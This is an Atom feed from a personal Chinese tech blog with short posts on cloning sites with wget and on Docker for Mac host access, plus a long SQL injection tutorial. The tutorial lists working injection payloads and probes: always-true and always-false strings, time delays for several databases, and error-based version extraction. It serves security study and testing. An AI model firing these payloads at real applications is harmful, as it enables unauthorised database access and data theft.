<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sanmi&#39;s blog</title>
  
  <subtitle>天下武功，无坚不破，唯快不破</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.sanmi.site/"/>
  <updated>2019-06-06T07:30:51.780Z</updated>
  <id>http://blog.sanmi.site/</id>
  
  <author>
    <name>SanmiYoo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>wget备忘录</title>
    <link href="http://blog.sanmi.site/2019/06/06/wget%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://blog.sanmi.site/2019/06/06/wget备忘录/</id>
    <published>2019-06-06T07:27:42.000Z</published>
    <updated>2019-06-06T07:30:51.780Z</updated>
    
    <content type="html"><![CDATA[<p><strong>## 使用wget克隆网站</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -k -p -nH -N http://xxxweb.com</span><br></pre></td></tr></table></figure><p><strong><em>\</em>各参数说明**</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-k     把已下载文件中的所有链接都转换为本地引用，不再依赖原始或在线内容</span><br><span class="line">-p     下载所有必要文件，确保离线可用，包括图片和样式表</span><br><span class="line">-nH    禁止把文件下载到以主机名为前缀的文件夹中</span><br><span class="line">-N     启用文件的时间戳，以匹配来源的时间戳</span><br><span class="line"></span><br><span class="line">下面两项可选:</span><br><span class="line">-r     递归下载</span><br><span class="line">-l     指定最大的递归深度，0为无限。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="工具" scheme="http://blog.sanmi.site/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Docker for Mac与宿主机通信</title>
    <link href="http://blog.sanmi.site/2019/06/06/Docker-for-Mac%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E9%80%9A%E4%BF%A1/"/>
    <id>http://blog.sanmi.site/2019/06/06/Docker-for-Mac与宿主机通信/</id>
    <published>2019-06-06T01:42:12.000Z</published>
    <updated>2019-06-06T02:20:02.579Z</updated>
    
    <content type="html"><![CDATA[<p>因为Docker for Mac的实现与Docker for Linux的实现有些不一样，所以在Mac上，当容器需要与宿主机进行通信的时候，发现直接访问宿主机的IP（ 172.17.0.1）是访问不通的。Mac的宿主机上，也没有docker0这个虚拟网卡。<br>当尝试访问宿主机的一个端口时，会提示Connection refused.</p><p>在container中应当使用一个特殊的DNS来访问宿主机<code>docker.for.mac.host.internal</code></p><p>参考链接：(<a href="https://imhanjm.com/2018/12/16/macos%20docker%20container%E8%BF%9E%E6%8E%A5%E5%AE%BF%E4%B8%BB%E6%9C%BA172.17.0.1%E7%9A%84%E5%8A%9E%E6%B3%95/" target="_blank" rel="noopener">Macos Docker container连接宿主机172.17.0.1的办法</a></p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Docker" scheme="http://blog.sanmi.site/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入漏洞总结</title>
    <link href="http://blog.sanmi.site/2019/05/15/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://blog.sanmi.site/2019/05/15/SQL注入漏洞总结/</id>
    <published>2019-05-15T14:54:27.530Z</published>
    <updated>2019-05-15T15:18:34.130Z</updated>
    
    <content type="html"><![CDATA[<hr><h2 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h2><h3 id="一、SQL语句基础知识"><a href="#一、SQL语句基础知识" class="headerlink" title="一、SQL语句基础知识"></a>一、SQL语句基础知识</h3><h4 id="1-UNION联合查询"><a href="#1-UNION联合查询" class="headerlink" title="1. UNION联合查询"></a>1. UNION联合查询</h4><blockquote><p>UNION去重且排序，UNION ALL不去重不排序。<br>UNION ALL的执行速度会快一些.</p></blockquote><h4 id="2-优先级"><a href="#2-优先级" class="headerlink" title="2. 优先级"></a>2. 优先级</h4><blockquote><p>AND 的优先级比 OR 的优先级要高。先计算AND的结果，再计算or的结果<br>同优先级AND中如果有恒为0(如and 1=2),则直接返回0，不执行同级中后面的语句<br>多个OR连接的语句中如果有恒为1(如or 1=1),则直接返回1，不执行同级中后面的语句</p></blockquote><h4 id="3-SQL-转义字符"><a href="#3-SQL-转义字符" class="headerlink" title="3.  SQL 转义字符"></a>3.  SQL 转义字符</h4><h5 id="1）通用特殊字符"><a href="#1）通用特殊字符" class="headerlink" title="1）通用特殊字符"></a>1）通用特殊字符</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;（单引号）：代码与数据间的分界线。</span><br><span class="line">可以使用单引号把数字值引起来，大多数数据库将把该值转换为他所代表的数值。Microsoft SQL Server 例外。</span><br></pre></td></tr></table></figure><h5 id="2）注释字符"><a href="#2）注释字符" class="headerlink" title="2）注释字符"></a>2）注释字符</h5><table><thead><tr><th>–</th><th>用于单行注释</th><th>SQL server<br>Oracle<br>PostgreSQl</th></tr></thead><tbody><tr><td>/<em>    </em>/</td><td>用于多行注释</td><td>SQL server<br>Oracle<br>PostgreSQl</td></tr><tr><td>–</td><td>用于单行注释。<br>要求第二个连字符后面跟一个空格或控制字符（如制表符、换行符）</td><td>MySQL</td></tr><tr><td>#</td><td>用于单行注释</td><td>MySQL</td></tr><tr><td>/<em>    </em>/</td><td>用于多行注释</td><td>MySQL</td></tr></tbody></table><h5 id="3）拼接字符"><a href="#3）拼接字符" class="headerlink" title="3）拼接字符"></a>3）拼接字符</h5><h5 id="4）执行多条语句"><a href="#4）执行多条语句" class="headerlink" title="4）执行多条语句"></a>4）执行多条语句</h5><p>SQL Server 6.0/MySQL 4.1(默认未开启)/Oracle PL/SQL 允许在同一链接句柄上执行包含多条语句的字符串。可以用<code>;</code>执行多条语句。服务器将依次执行每条语句，数据库服务器向客户端返回每条语句发送的结果集。<br>如：<code>http://www.a.com/a.aspx?user=54;select *****;--</code></p><h3 id="二、数据库元数据"><a href="#二、数据库元数据" class="headerlink" title="二、数据库元数据"></a>二、数据库元数据</h3><h4 id="1-Mysql-版本5-0及以后"><a href="#1-Mysql-版本5-0及以后" class="headerlink" title="1. Mysql(版本5.0及以后)"></a>1. Mysql(版本5.0及以后)</h4><ol><li>元数据位于<code>INFORMATION_SCHEMA</code>虚拟数据库中，可通过<code>SHOW DATABASES</code>和<code>SHOW TABLES</code>命令访问。</li><li>所有MySQL用户均有权访问该数据库中的表，但只能查看表中与该用户访问权限相对应的对象的行。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 列举当前用户可访问的所有的表和数据库</span><br><span class="line">SELECT table_schema,table_name FROM information_schema.tables;</span><br></pre></td></tr></table></figure><h4 id="2-SQL-Server"><a href="#2-SQL-Server" class="headerlink" title="2. SQL Server"></a>2. SQL Server</h4><ol><li>可通过<code>INFORMATION_SCHEMA</code>或系统表<code>SYSOBJECTS,SYSINDEXKEYS,SYSINDEXES,SYSCOLUMNS,SYSTYPES等</code>或系统存储过程来访问元数据。</li><li>SQLServer 2005引入了一些名为<code>sys.</code>的目录试图，并限制用户只能访问拥有相对应权限的对象。所有的用户均有权访问数据库中的表并查看表中的所有行，而不管用户是否对表或所查阅的数据拥有相对应的访问权限。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--使用目录视图列举所有可访问的表</span><br><span class="line">SELECT name FROM sys.tables;</span><br></pre></td></tr></table></figure><h4 id="3-Oracle"><a href="#3-Oracle" class="headerlink" title="3. Oracle"></a>3. Oracle</h4><ol><li>有很多全局内置视图来访问 Oracle 的元数据</li><li><p>ALL_TABLES, ALL_TAB_COLUMNS `列出了当前用户可访问的属性和对象。</p></li><li><p><code>USER_</code>开头的视图只显示当前用户拥有的对象</p></li><li><p><code>DBA_</code>开头的视图显示数据库中的所有对象。需要有 DBA 权限</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--列举当前用户可访问的所有的表</span></span><br><span class="line"><span class="keyword">SELECT</span> OWNER, TABLE_NAME <span class="keyword">FROM</span> ALL_TABLES <span class="keyword">ORDER</span> <span class="keyword">BY</span> TABLE_NAME;</span><br></pre></td></tr></table></figure><h2 id="0x01-SQL注入介绍"><a href="#0x01-SQL注入介绍" class="headerlink" title="0x01 SQL注入介绍"></a>0x01 SQL注入介绍</h2><h3 id="一、SQL注入产生的原因"><a href="#一、SQL注入产生的原因" class="headerlink" title="一、SQL注入产生的原因"></a>一、SQL注入产生的原因</h3><h3 id="二、SQL注入分类"><a href="#二、SQL注入分类" class="headerlink" title="二、SQL注入分类"></a>二、SQL注入分类</h3><h4 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1. 报错注入"></a>1. 报错注入</h4><h4 id="2-SQL-盲注"><a href="#2-SQL-盲注" class="headerlink" title="2. SQL 盲注"></a>2. SQL 盲注</h4><p>SQL 盲注是一种SQL 注入漏洞，攻击者可以操纵 SQL 语句，应用会针对真假条件返回不同的值。但是攻击者无法检索查询结果。</p><h2 id="0x02-SQL注入的测试方法"><a href="#0x02-SQL注入的测试方法" class="headerlink" title="0x02 SQL注入的测试方法"></a>0x02 SQL注入的测试方法</h2><p>并不存在真正完美的规则可以确定某个输入是否会触发 SQL 注入漏洞，因为存在无数种可能的情况。测试潜在的 SQL 注入时，必须坚持不懈并留心细节信息，这一点非常重要。</p><p>在心里重建开发人员在 web 应用中编写的代码以及设想远程 SQL 代码的内容以及潜在效果。这一点非常重要。</p><h3 id="一、通过报错信息测试-SQL-注入"><a href="#一、通过报错信息测试-SQL-注入" class="headerlink" title="一、通过报错信息测试 SQL 注入"></a>一、通过报错信息测试 SQL 注入</h3><p><strong>我们通常用注入一个<code>&#39;</code>的方式，来通过返回的数据库报错信息来判断是否有 SQL 注入。</strong></p><blockquote><p>如果一个参数本应接收为一个数字，而输入了一个字符串。则 MySQL、SQL Server 会认为，如果该值不是一个数字，那么他肯定是个列名。</p></blockquote><h4 id="0-关于报错信息"><a href="#0-关于报错信息" class="headerlink" title="0. 关于报错信息"></a>0. 关于报错信息</h4><p>当Web服务器收到数据库返回的错误信息时，一般会选择如下几种方式进行返回。</p><ol><li>将 SQL 错误显示在页面上，对 Web 浏览器用户可见.</li><li>将 SQL 错误隐藏在 web 页面的源代码中以便于调试</li><li>检测到错误时跳转到另一个页面。</li><li>返回 HTTP 错误代码 500 或 HTTP 重定向代码 302</li><li>应用适当的处理错误但不显示结果，可能会显示一个通用的错误页面。</li></ol><h4 id="1-典型的-MySQL-报错举例"><a href="#1-典型的-MySQL-报错举例" class="headerlink" title="1. 典型的 MySQL 报错举例"></a>1. 典型的 MySQL 报错举例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP+MySQL</span><br><span class="line">Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /var/www/a.com/a.php on line 8</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: You have an error in your SQL syntax; check the manual that corresponds to your MYSQL server version for the right syntax to use near &apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error: Unknow columns &apos;test&apos; in &apos;where clause&apos;</span><br><span class="line">如果注入的参数不是一个字符串（不需要单引号），则如上报错</span><br></pre></td></tr></table></figure><h4 id="2-典型的-Oracle-错误举例"><a href="#2-典型的-Oracle-错误举例" class="headerlink" title="2. 典型的 Oracle 错误举例"></a>2. 典型的 Oracle 错误举例</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java &amp; Oracle</span><br><span class="line">java.sql.SQLException: ORA-00933: SQL command not properly ended at oracle.jdbc.dbaccess.DBError.throwSqlException(DBError.java:180) at oracle.jdbc.ttc7.TTIoer.processError(TTIoer.java:208)</span><br><span class="line">表明了语法上不正确的 SQL 语句</span><br><span class="line"></span><br><span class="line">Error: SQLExceptionjava.sql.SQLException: ORA-01756: quoted string not properly terminated</span><br><span class="line">该错误表明 Oracle 数据库检测到 SQL语句中有一个使用单引号引起来的字符串未被正确结束。（使用了单引号报错）</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.NET &amp; Oracle</span><br><span class="line">ORA-01756: quoted string not properly terminated System.Web.</span><br><span class="line">HttpUnhandledException: Exception of type 'System.Web.HttpUnhandleException' was thrown. <span class="comment">---&gt; System.Data.OleDb.OleDbException: ORA-01756: quoted string not properly terminted</span></span><br><span class="line">单引号报错</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php &amp; Oracle</span><br><span class="line">PHP的ociparse()函数用户准备要执行的 Oracle 语句。</span><br><span class="line">Warning: ociparse() [function.ociparse]: ORA-01756: quoted string not properly terminated in /var/www/a.com/ocitest.php on line 31</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">java.sql.SQLException: ORA-00907: missing right parenthesis atoracle.jdbc.dbaccess.DBError.throwSqlException(DBError.java:134) at oracle.jdbc.ttc7.TTloer.processError(TTloer.java:289) at oracle.jdbc.ttc7.receive(Oall7.java:582) at oracle.jdbc.ttc7.TTC7Protocol.doOall7(TTC7Protocol.java:986)</span><br><span class="line"></span><br><span class="line">数据库报告 SQL 语句中存在缺少右括号错误。很多原因会引发该错误。最常见的情况是攻击者在嵌套 SQL 语句中进行注入。例如一个嵌套查询。主 <span class="keyword">SELECT</span> 语句执行括号中的另一条 <span class="keyword">SELECT</span> 语句，如果攻击者向子查询语句注入了某些内容并将后面的 <span class="keyword">SQL</span>语句注释掉那么会返回该错误。如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> field1, field2,</span><br><span class="line">(<span class="keyword">SELECT</span> field1 </span><br><span class="line"><span class="keyword">FROM</span> table2</span><br><span class="line"><span class="keyword">WHERE</span> something = [attacker contorooled <span class="keyword">variable</span>])</span><br><span class="line"><span class="keyword">as</span> field3 </span><br><span class="line"><span class="keyword">FROM</span> table1</span><br></pre></td></tr></table></figure><h4 id="3-PostgreSQL-错误举例"><a href="#3-PostgreSQL-错误举例" class="headerlink" title="3. PostgreSQL 错误举例"></a>3. PostgreSQL 错误举例</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">单引号报错</span><br><span class="line">Query failed: ERROR: unterminated quoted string at or near "'''"</span><br><span class="line"></span><br><span class="line">其他常规错误，如圆括号等</span><br><span class="line">Query failed: ERROR: syntex error at or near ""</span><br></pre></td></tr></table></figure><h3 id="二、通过真假条件判断-SQL-注入"><a href="#二、通过真假条件判断-SQL-注入" class="headerlink" title="二、通过真假条件判断 SQL 注入"></a>二、通过真假条件判断 SQL 注入</h3><p>由于Web 应用收到数据库错误时，会做不同的处理。下面将介绍一些不直接在浏览器中显示数据库报错的示例。需要注意的是，操纵参数产生的错误，可能与SQL 注入无关。</p><p>Web 应用可能对于所有的错误，均返回一个通用的错误页面。如下图为 ASP.NET的错误页面。具体的行为取决于 web 服务器的配置。</p><p><img src="../../../../%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/assets/756886-20160926012545213-933044801-7901564.png" alt="756886-20160926012545213-933044801"></p><p><strong>如果测试web 站点时发现应用始终返回默认或自定义的错误页面，就需要弄清楚该错误是不是由 SQL 注入引发的。可以通过向参数中插入不会触发应用错误的 SQL 代码来进行测试</strong></p><p>举例，当我们插入单引号引发统一报错时，服务端的 SQL 查询语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FORM</span> products</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">category</span> = <span class="string">'[attackers control]'</span></span><br></pre></td></tr></table></figure><p>在这个例子中，我们可以猜测，我们尝试注入的是一个用单引号控制的字符串。此时尝试注入一些不会产生错误的内容。</p><p><strong>永真语句： <code>’ or &#39;1&#39;=&#39;1</code></strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FORM</span> products</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">category</span> = <span class="string">'bikes'</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></span><br><span class="line">如果存在 <span class="keyword">sql</span> 注入，那么上述代码将返回 products 中的所有行</span><br></pre></td></tr></table></figure><blockquote><p>注入永真条件有一个缺点：查询结果会包含表中的所有记录。如果数据量过大，则会查询的时间很长，且会消耗过多的服务器资源。</p></blockquote><p><strong>无影响语句：<code>&#39; or &#39;1&#39;=&#39;2</code>     <code>&#39; and &#39;1&#39;=&#39;1</code></strong></p><p>该方法不会对查询结果产生任何影响。</p><p><strong>永假语句<code>&#39; and &#39;1&#39;=&#39;2</code></strong><br>该语句不会返回任何结果。</p><blockquote><p>通过对不同影响的语句产生的结果不同为对照来确认是否存在 SQL注入</p></blockquote><p><strong>例外：</strong>有很多原因，即使注入了一个永假条件，也可能会返回结果。</p><p>​           比如如果 SQL 语句为一个联合查询，如果注入参数只影响了查询的一部分。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> products</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">category</span> = <span class="string">'bikes'</span> <span class="keyword">AND</span> <span class="string">'1'</span>=<span class="string">'2'</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> *</span><br><span class="line"><span class="keyword">FROM</span> new_products</span><br></pre></td></tr></table></figure><h3 id="三、对字符型通过拼接字符串判断-SQL-注入-amp-识别数据库类型"><a href="#三、对字符型通过拼接字符串判断-SQL-注入-amp-识别数据库类型" class="headerlink" title="三、对字符型通过拼接字符串判断 SQL 注入&amp;识别数据库类型"></a>三、对字符型通过拼接字符串判断 SQL 注入&amp;识别数据库类型</h3><p>Oracle &amp; PostgreSQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/sn=bikes</span><br><span class="line">www.xxx.com/sn=bi&apos;&amp;#124;&amp;#124;&apos;kes</span><br></pre></td></tr></table></figure><p>Microsoft SQL Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/sn=bikes</span><br><span class="line">www.xxx.com/sn=bi&apos;+&apos;kes</span><br></pre></td></tr></table></figure><p>MySQL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/sn=bikes</span><br><span class="line">www.xxx.com/sn=bi&apos;&apos;kes</span><br></pre></td></tr></table></figure><p>如果以上两个请求的结果相同，则很可能存在 SQL 注入漏洞</p><h3 id="四、对数字型采用数据计算确认-SQL-注入"><a href="#四、对数字型采用数据计算确认-SQL-注入" class="headerlink" title="四、对数字型采用数据计算确认 SQL 注入"></a>四、对数字型采用数据计算确认 SQL 注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.php?id=3-1</span><br><span class="line">http://www.a.com/a.php?id=4-2</span><br><span class="line">http://www.a.com/a.php?id=5-3</span><br><span class="line">返回的结果同 id=2</span><br></pre></td></tr></table></figure><p>当然，也可以通过加法执行该测试，不过。因为加号是 URI的保留字，需要进行编码。可以用<code>%2B</code>来代替+</p><h3 id="五、盲注"><a href="#五、盲注" class="headerlink" title="五、盲注"></a>五、盲注</h3><h4 id="1-时间延时注入"><a href="#1-时间延时注入" class="headerlink" title="1. 时间延时注入"></a>1. 时间延时注入</h4><p>当测试是否存在 SQL 注入的时候，经常会因为各种原因无法直接确认注入的存在，可以通过对数据库注入时间延时，并检查服务器的响应是否也产生了延迟。</p><blockquote><p>Web 服务器虽然可以隐藏错误或数据，但必须等待数据库返回结果。</p></blockquote><h5 id="1）MSSQL"><a href="#1）MSSQL" class="headerlink" title="1）MSSQL"></a>1）MSSQL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 引入延迟的内置命令</span><br><span class="line">WAITFOR DELAY &apos;hours:minutes:seconds&apos;</span><br><span class="line"></span><br><span class="line">-- 举例：</span><br><span class="line">http://www.a.com/a.aspx?uid=45;waitfor delay &apos;0:0:5&apos;;--</span><br></pre></td></tr></table></figure><h5 id="2-MySQL"><a href="#2-MySQL" class="headerlink" title="2) MySQL"></a>2) MySQL</h5><ol><li><p><strong><code>BENCHMARK</code>函数会将一个表达式执行许多次</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.php?id=32;SELECT BENCHMARK(10000000,ENCODE(&apos;hello,&apos;mom&apos;));--</span><br></pre></td></tr></table></figure></li><li><p><code>SLEEP</code>函数</p><blockquote><p>添加sleep(N)这个函数后，语句的执行具体会停留多长时间取决于满足条件的记录数.如果记录数是 0，则不停留</p></blockquote><p>由于MySQL的条件优先级的不同，在不同语句中执行sleep()函数导致的延迟时间（执行次数）不同，一个比较简单的判断就是，判断sleep()函数所在的点，进行数据查询时需要对比的数据记录数，即等于sleep()函数执行的次数。</p></li></ol><h5 id="3）Oracle-PL-SQL"><a href="#3）Oracle-PL-SQL" class="headerlink" title="3）Oracle PL/SQL"></a>3）Oracle PL/SQL</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_LOCK.SLEEP(5);</span><br><span class="line">END;</span><br><span class="line">-- 只有数据库管理员才能使用 DBMS_LOCK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbms_pipe.receive_message(&apos;RDS&apos;, 10)</span><br><span class="line">-- 可以用在 SQL 语句中的函数。推荐用这个函数</span><br><span class="line">http://www.a.com/a.php?id=32 or 1=dbms_pipe.receive_message(&apos;RDS&apos;, 10)</span><br></pre></td></tr></table></figure><h5 id="4）PostgreSQL"><a href="#4）PostgreSQL" class="headerlink" title="4）PostgreSQL"></a>4）PostgreSQL</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.a.com/a.php?id=32;<span class="keyword">SELECT</span> pg_sleep(<span class="number">10</span>);<span class="comment">--</span></span><br><span class="line"><span class="comment">-- 需要 8.2及以上版本</span></span><br></pre></td></tr></table></figure><h3 id="六、宽字节注入"><a href="#六、宽字节注入" class="headerlink" title="六、宽字节注入"></a>六、宽字节注入</h3><h3 id="七、注入测试-POC-汇总"><a href="#七、注入测试-POC-汇总" class="headerlink" title="七、注入测试 POC 汇总"></a>七、注入测试 POC 汇总</h3><h5 id="1-内联注入-poc-汇总"><a href="#1-内联注入-poc-汇总" class="headerlink" title="1. 内联注入 poc 汇总"></a>1. 内联注入 poc 汇总</h5><p>内联注入是指向查询注入一些 SQL 代码后，原来的查询仍然会全部执行。</p><p><strong>字符串内联注入</strong></p><table><thead><tr><th>测试字符串</th><th>变形</th><th>预期结果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ OR ‘1’=’1</td><td>1’)or(‘1’=’1</td><td>永真条件。如果成功，将返回表中的所有行</td></tr><tr><td>1’ or ‘1’=’2</td><td>1’)or(‘1’=’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’=’2</td><td>1’)and(‘1’=’2</td><td>永假条件。如果成功，将不返回表中的任何行</td></tr><tr><td>1’ or ‘ab’=’a’+’b</td><td>1’)or(‘ab’=’a’+’b</td><td>SQL Server 字符串连接。永真条件。</td></tr><tr><td>1’ or ‘ab’=’a’’b</td><td>1’)or(‘ab’=’a’’b</td><td>MySQL字符串连接。永真条件</td></tr><tr><td>1’ or ‘ab’=’a’&#124;&#124;’b</td><td>1’)or(‘ab’=’a’&#124;&#124;’b</td><td>Oracle 字符串连接。永真条件</td></tr></tbody></table><p><strong>数字值内联注入</strong></p><table><thead><tr><th>测试字符串</th><th>变形</th><th>预期结果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>3-1</td><td>1+1</td><td>如果成功，将返回与操作结果相同的值</td></tr><tr><td>1 or 1=1</td><td>1)or(1=1</td><td>永真条件。如果成功将返回表中所有的行</td></tr><tr><td>1 or 1=2</td><td>1)or(1=2</td><td>空条件，如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1 and 1=2</td><td>1)and(1=2</td><td>永假条件。如果成功，将不返回任何行</td></tr><tr><td>1 or ‘ab’=’a’+’b’</td><td>1)or(‘ab’=’a’+’b’</td><td>SQL Server 字符串拼接。永真条件</td></tr><tr><td>1 OR ‘ab’=’a’’b’</td><td>1)or(‘ab’=’a’’b’</td><td>Mysql 字符串拼接。永真条件</td></tr><tr><td>1 OR ‘ab’=’a’&#124;&#124;’b’</td><td>1)or(‘ab’=’a’&#124;&#124;’b’</td><td>Oracle 字符串拼接。永真条件</td></tr></tbody></table><h5 id="2-终止式-SQL-注入-POC-汇总"><a href="#2-终止式-SQL-注入-POC-汇总" class="headerlink" title="2. 终止式 SQL 注入 POC 汇总"></a>2. 终止式 SQL 注入 POC 汇总</h5><table><thead><tr><th>测试字符串</th><th>变形</th><th>预期结果</th></tr></thead><tbody><tr><td>admin’–</td><td>admin’)–</td><td></td></tr><tr><td>admin’#</td><td>admin’)#</td><td></td></tr><tr><td>1–</td><td>1)–</td><td></td></tr><tr><td>1 or 1=1–</td><td>1)or1=1–</td><td></td></tr><tr><td>‘ or ‘1’=’1’–</td><td>‘) or ‘1’=’1’–</td><td></td></tr><tr><td>-1 and 1=2–</td><td>-1) and 1=2–</td><td></td></tr><tr><td>‘and’1’=2–</td><td>‘)and’1’=2–</td><td></td></tr><tr><td>1/**/</td><td></td></tr></tbody></table><h2 id="0x03-SQL注入的进一步利用"><a href="#0x03-SQL注入的进一步利用" class="headerlink" title="0x03 SQL注入的进一步利用"></a>0x03 SQL注入的进一步利用</h2><h3 id="一、获取数据库信息"><a href="#一、获取数据库信息" class="headerlink" title="一、获取数据库信息"></a>一、获取数据库信息</h3><h4 id="1-通过报错获取数据库信息"><a href="#1-通过报错获取数据库信息" class="headerlink" title="1. 通过报错获取数据库信息"></a>1. 通过报错获取数据库信息</h4><h5 id="1）利用-SQL-Server的类型转换"><a href="#1）利用-SQL-Server的类型转换" class="headerlink" title="1）利用 SQL Server的类型转换"></a>1）利用 SQL Server的类型转换</h5><p>当我们发送类似于<code>0/@@version</code>作为注入代码时，除法运算需要两个数字作为操作数，所以数据库尝试将<code>@@version</code>函数的结果转换成数字。当该操作失败时，数据库会显示出变量的内容。</p><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/a.aspx?a=bikes&apos; and 1=0/@@version;--</span><br><span class="line">http://www.test.com/a.aspx?a=bikes&apos; and 1=0/user;--</span><br></pre></td></tr></table></figure><h5 